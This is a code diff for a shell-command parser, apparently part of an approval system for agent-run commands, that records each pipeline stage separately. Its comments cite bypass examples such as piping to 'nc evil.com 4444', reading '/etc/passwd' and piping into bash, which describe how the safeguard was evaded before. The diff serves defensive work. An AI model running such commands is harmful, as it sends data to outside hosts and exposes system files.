@@ -949,6 +949,25 @@ export interface BashSegment {
   text: string;
   /** Operators present within the segment (e.g. "|", ">", "2>"). */
   ops: string[];
+  /**
+   * The pipeline stages of this segment, as the AST saw them (G1).
+   *
+   * A pipeline is ONE segment (its stages share a cwd and a stdin chain) but
+   * every rule that decides what the segment RUNS must decide it per stage:
+   * the signature of stage 0 used to speak for the whole pipe — `ls | nc
+   * evil.com 4444` was signed "ls", `cd /etc && true | cat passwd` never saw
+   * the base its second stage read. Consumers used to re-split the text with
+   * `splitOnPipe` (and `segment-analysis.ts` hand-built a pseudo-segment per
+   * stage, which is how the 2026-08-24 `ls | bash /any/script` hole got
+   * patched); a parser-built list keeps one authority for what a stage is.
+   *
+   * Absent (or one entry) = the segment is a single command. A stage may
+   * itself be a compound (`(cd x && y) | grep` folds the LAST inner segment);
+   * list operators inside a stage are handled by `splitIntoSegments`.
+   * Use `segmentStages(seg)` — it falls back to a quote-aware text split for
+   * hand-built segments (delegation tails, tmux payloads).
+   */
+  stages?: string[];
   /** Whether this segment contains subshell constructs ($(), ``). */
   hasSubshell: boolean;
   /** Inner command texts of subshell $() and process >() substitutions (empty if none). */
@@ -1182,7 +1201,22 @@ function extractSegmentsFromNode(
       }
     }
     if (cmdTexts.length > 0) {
-      pushSeg({ text: cmdTexts.join(" | "), ops: [...ops], hasSubshell: segHasSubshell, subshellTexts: extractSubshellInnerTexts(n) });
+      pushSeg({
+        text: cmdTexts.join(" | "),
+        ops: [...ops],
+        hasSubshell: segHasSubshell,
+        subshellTexts: extractSubshellInnerTexts(n),
+        // G1: the stages of the pipe, verbatim from the AST children (the
+        // `text` above is a reconstruction — it normalizes "|&" to " | ").
+        // Only the folded compound can carry list operators inside a stage.
+        // Empty stage texts are dropped: `() | cat` runs one command, and an
+        // empty stage would read as an unapproved one (the text split used to
+        // drop it — same behavior, one authority).
+        stages: (() => {
+          const kept = cmdTexts.filter((t) => t.trim() !== "");
+          return kept.length > 1 ? kept : undefined;
+        })(),
+      });
       const idx = segments.length - 1;
       for (let i = 0; i < n.childCount; i++) {
         const child = n.child(i);
